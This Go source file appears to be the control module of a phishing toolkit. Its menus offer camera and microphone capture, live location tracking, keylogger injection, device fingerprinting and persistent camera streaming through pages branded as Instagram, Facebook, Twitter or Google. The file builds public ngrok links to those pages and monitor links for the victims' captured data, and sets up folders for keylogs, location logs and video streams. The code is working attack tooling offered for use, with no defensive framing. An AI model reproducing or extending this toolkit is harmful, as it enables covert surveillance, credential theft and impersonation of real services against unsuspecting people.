package internal

import (
	"fmt"
	"net"
	"os"
	"os/exec"
	"runtime"
	"sync"
)

// FindFreePort returns a free TCP port as a string
func FindFreePort() string {
	l, err := net.Listen("tcp", ":0")
	if err != nil {
		return "8080" // fallback
	}
	defer l.Close()
	addr := l.Addr().(*net.TCPAddr)
	return fmt.Sprintf("%d", addr.Port)
}

var NgrokBaseURL string // Set at runtime after ngrok starts
var ServerPort = "8080" // Default, will be set at runtime

func HandleCamMic() {
	fmt.Println("[Camera + Microphone Access]")
	fmt.Println("Select a brand:")
	fmt.Println("1. Instagram")
	fmt.Println("2. Facebook")
	fmt.Println("3. Twitter")
	fmt.Println("4. Google")
	fmt.Print("Enter choice: ")
	var sub string
	fmt.Scanln(&sub)
	var page string
	switch sub {
	case "1":
		page = "instagram.html"
	case "2":
		page = "facebook.html"
	case "3":
		page = "twitter.html"
	case "4":
		page = "google.html"
	default:
		fmt.Println("Invalid brand.")
		return
	}
	if NgrokBaseURL != "" {
		fmt.Printf("Phishing page: %s/cam_mic/%s\n", NgrokBaseURL, page)
		fmt.Printf("Result monitor: %s/monitor/cam_mic\n", NgrokBaseURL)
	} else {
		fmt.Printf("Phishing page: http://localhost:%s/cam_mic/%s\n", ServerPort, page)
		fmt.Printf("Result monitor: http://localhost:%s/monitor/cam_mic\n", ServerPort)
	}
}

func HandleLocation() {
	fmt.Println("[Live Location Capture]")
	if NgrokBaseURL != "" {
		fmt.Printf("Phishing page: %s/location/index.html\n", NgrokBaseURL)
		fmt.Printf("Result monitor: %s/monitor/location\n", NgrokBaseURL)
	} else {
		fmt.Printf("Phishing page: http://localhost:%s/location/index.html\n", ServerPort)
		fmt.Printf("Result monitor: http://localhost:%s/monitor/location\n", ServerPort)
	}
}

func HandleKeylogger() {
	fmt.Println("[Keylogger Injection]")
	if NgrokBaseURL != "" {
		fmt.Printf("Phishing page: %s/keylogger/index.html\n", NgrokBaseURL)
		fmt.Printf("Result monitor: %s/monitor/keylogs\n", NgrokBaseURL)
	} else {
		fmt.Printf("Phishing page: http://localhost:%s/keylogger/index.html\n", ServerPort)
		fmt.Printf("Result monitor: http://localhost:%s/monitor/keylogs\n", ServerPort)
	}
}

func HandleDeviceInfo() {
	fmt.Println("[Device Info Retrieval]")
	if NgrokBaseURL != "" {
		fmt.Printf("Phishing page: %s/device_info/index.html\n", NgrokBaseURL)
		fmt.Printf("Result monitor: %s/monitor/device_info\n", NgrokBaseURL)
	} else {
		fmt.Printf("Phishing page: http://localhost:%s/device_info/index.html\n", ServerPort)
		fmt.Printf("Result monitor: http://localhost:%s/monitor/device_info\n", ServerPort)
	}
}

func HandlePersistentCam() {
	fmt.Println("[Persistent Camera Video Access]")
	fmt.Println("Select a brand:")
	fmt.Println("1. Instagram")
	fmt.Println("2. Facebook")
	fmt.Println("3. Twitter")
	fmt.Println("4. Google")
	fmt.Print("Enter choice: ")
	var sub string
	fmt.Scanln(&sub)
	var page string
	switch sub {
	case "1":
		page = "instagram.html"
	case "2":
		page = "facebook.html"
	case "3":
		page = "twitter.html"
	case "4":
		page = "google.html"
	default:
		fmt.Println("Invalid brand.")
		return
	}
	if NgrokBaseURL != "" {
		fmt.Printf("Phishing page: %s/persistent_cam/%s\n", NgrokBaseURL, page)
		fmt.Printf("Result monitor: %s/monitor/persistent_cam\n", NgrokBaseURL)
		fmt.Printf("Captured media: %s/monitor/persistent_cam?media=1\n", NgrokBaseURL)
	} else {
		fmt.Printf("Phishing page: http://localhost:%s/persistent_cam/%s\n", ServerPort, page)
		fmt.Printf("Result monitor: http://localhost:%s/monitor/persistent_cam\n", ServerPort)
		fmt.Printf("Captured media: http://localhost:%s/monitor/persistent_cam?media=1\n", ServerPort)
	}
}

// Helper to ensure results folders exist
func EnsureResultsFolders() {
	folders := []string{
		"results/cam_mic_logs",
		"results/location_logs",
		"results/keylogs",
		"results/device_logs",
		"results/persistent_streams",
	}
	for _, folder := range folders {
		os.MkdirAll(folder, 0755)
	}
}

// Helper to run multiple functions concurrently and wait for all to finish
func RunSimultaneously(funcs ...func()) {
	var wg sync.WaitGroup
	wg.Add(len(funcs))
	for _, f := range funcs {
		go func(fn func()) {
			defer wg.Done()
			fn()
		}(f)
	}
	wg.Wait()
}

// Helper to open ngrok dashboard in browser (optional)
func OpenNgrokConsole() {
	url := "http://localhost:4040"
	var cmd *exec.Cmd
	if runtime.GOOS == "windows" {
		cmd = exec.Command("cmd", "/C", "start", url)
	} else if runtime.GOOS == "linux" {
		cmd = exec.Command("xdg-open", url)
	} else if runtime.GOOS == "darwin" {
		cmd = exec.Command("open", url)
	}
	if cmd != nil {
		cmd.Start()
	}
}
